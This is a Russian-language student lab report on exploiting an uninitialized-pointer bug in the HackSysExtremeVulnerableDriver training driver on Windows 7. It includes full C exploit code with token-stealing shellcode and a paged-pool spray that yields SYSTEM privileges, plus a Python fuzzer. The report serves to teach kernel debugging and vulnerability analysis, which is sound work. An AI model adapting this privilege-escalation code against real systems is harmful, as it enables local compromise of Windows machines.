2 1. Цель работы Изучение типовых уязвимостей в драйверах режима ядра ОС Windows и способов их эксплуатации. Освоение навыков отладки драйверов и анализа паде-ний системы.     3 2. Ход работы Вариант для выполнения лабораторной работы – 7. Была настроена виртуаль-ная машина для возможности её отладки с использованием отладчика WinDBG c ОС Windows 7 x86. В IDA Pro в дизассемблированном коде .sys файла драйвера было найдено имя устройства и IOCTL-код (рисунки 1 и 2).   Рисунок 1 – Имя устройства  Рисунок 2 –Получение IOCTL-кода При верном полученном IOCTL-коде получаем выход на функцию sub_44410A. В ней проверяется значение из пользовательского буфера, при совпа-дении с зафиксированным значением (0x222433) переменные будут инициализиро-ваны. Далее, если в переменной не NULL указатель, то произойдёт вызов функции по адресу этой переменной (v4). 4  Рисунок 5 – Уязвимая функция Если подать неверное значение, то переменные не будут инициализированы, а вызов произойдёт по адресу переменной .CallBack. Но этот указатель не инициа-лизировался null-значением, поэтому в итоге будет вызываться всё, на что указы-вает этот указатель, хранящийся в paged pool. Далее был написан фаззер, основанный на множественных обращениях к уяз-вимому драйверу с различными входными данными. При подаче различных буфе-ров можно получить падение системы. Call-stack приведён в приложении C. 5  Рисунок 6 – Падение системы Для эксплуатации уязвимости (приложение A) необходимо сначала создать char-массив с шеллкодом. Так как неинициализированная память находится в paged pool, то для эксплуатации можно создать большое (256) количество именованных событий, так как их имена будут храниться в paged pool. Таким образом, необхо-димо создать 256 событий с уникальными именами, в которых в байтах 4-7 (что соответствует расположению члена Callback) будет храниться адрес шелл-кода. На рисунке 7 представлен результат эксплуатации уязвимости.  6  Рисунок 7– Эксплуатация уязвимости, получение системных прав           7 3. Вывод В ходе выполнения лабораторной работы были освоены навыков отладки драйверов и анализа падений системы. Была изучена уязвимость неинициализиро-ванной переменной в куче и способ её эксплуатации, в результате которой процесс получил системные права. Для устранения уязвимости, необходимо убедиться, например, чтобы переменная, по адресу которой в дальнейшем будет команда call, была всегда инициализирована NULL.     8 Приложение A #include<stdio.h> #include<Windows.h>  HANDLE hDevice = NULL;  static VOID ShellCode() {  _asm  {   //int 3   pushad   mov eax, fs: [124h]  // Find the _KTHREAD structure for the current thread   mov eax, [eax + 0x50]   // Find the _EPROCESS structure   mov ecx, eax   mov edx, 4    // edx = system PID(4)    // The loop is to get the _EPROCESS of the system   find_sys_pid :       mov eax, [eax + 0xb8] // Find the process activity list       sub eax, 0xb8      // List traversal       cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID       jnz find_sys_pid        // Replace the Token       mov edx, [eax + 0xf8]       mov[ecx + 0xf8], edx       popad       //int 3       ret  } }  BOOL init() {  // Get HANDLE  hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver_mbks",   GENERIC_READ | GENERIC_WRITE,   NULL,   NULL,   OPEN_EXISTING,   NULL,   NULL);   printf("[+]Start to get HANDLE...\n");  if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)  {   return FALSE;  }  printf("[+]Success to get HANDLE!\n");  return TRUE; }  static VOID CreateCmd() {  STARTUPINFO si = { sizeof(si) };  PROCESS_INFORMATION pi = { 0 };  si.dwFlags = STARTF_USESHOWWINDOW;  si.wShowWindow = SW_SHOW;  WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };  BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, 9 (LPSTARTUPINFOW)& si, &pi);  if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess); }  HANDLE Event_OBJECT[0x1000];  VOID Trigger_shellcode() {  DWORD bReturn = 0;  char buf[4] = { 0 };  char lpName[0xf0] = { 0 };  *(PDWORD32)(buf) = 0xBAD0B0B0 + 1;    memset(lpName, 0x41, 0xf0);   printf("lpName is in 0x%p\n", lpName);  for (int i = 0; i < 256; i++)  {   *(PDWORD)(lpName + 0x4) = (DWORD)& ShellCode;   *(PDWORD)(lpName + 0xf0 - 4) = 0;   *(PDWORD)(lpName + 0xf0 - 3) = 0;   *(PDWORD)(lpName + 0xf0 - 2) = 0;   *(PDWORD)(lpName + 0xf0 - 1) = i;   Event_OBJECT[i] = CreateEventW(NULL, FALSE, FALSE, lpName);  }   for (int i = 0; i < 256; i++)  {   CloseHandle(Event_OBJECT[i]);   i += 4;  }   DeviceIoControl(hDevice, 0x222433, buf, 4, NULL, 0, &bReturn, NULL); }  int main() {   if (init() == FALSE)  {   printf("[+]Failed to get HANDLE!!!\n");   system("pause");   return 0;  }   Trigger_shellcode();  //__debugbreak();   printf("[+]Start to Create cmd...\n");  CreateCmd();  system("pause");   return 0; }  10 ПРИЛОЖЕНИЕ B import sys from ctypes import * import struct import os  kernel32 = windll.kernel32  def debug_print(message):     print(message)     kernel32.OutputDebugStringA(message + "\n")  def get_device_handle(device):     open_existing = 0x3     generic_read = 0x80000000     generic_write = 0x40000000     file_share_read = 0x00000001        file_share_write = 0x00000002     handle = kernel32.CreateFileW(device,                                 generic_read | generic_write,                                 file_share_read | file_share_write,                                 None,                                 open_existing,                                 None,                                 None)     if not handle or handle == -1:         debug_print("\t[-] Unable to get device handle")         sys.exit(-1)     return handle  if __name__ == "__main__":     device_name = "\\\\.\\HackSysExtremeVulnerableDriver_mbks"     device_handle = get_device_handle(device_name)     pool_buffer_size = 0xF0     debug_print("[+] Preparing user mode buffer")     for _ in range(5):         magicValue = struct.pack('<I', 0xBAD0B0B1)         bytes_returned = c_ulong()         ioctl = 0x222433         user_mode_buffer_str = os.urandom(pool_buffer_size-4)         user_mode_buffer = magicValue + user_mode_buffer_str         debug_print(f"magic value {magicValue}, user mode buffer {user_mode_buffer}\n\n")         result = kernel32.DeviceIoControl(device_handle,                         ioctl,                     user_mode_buffer,                     len(user_mode_buffer),                     None,                     0,                     byref(bytes_returned),                     None)   11  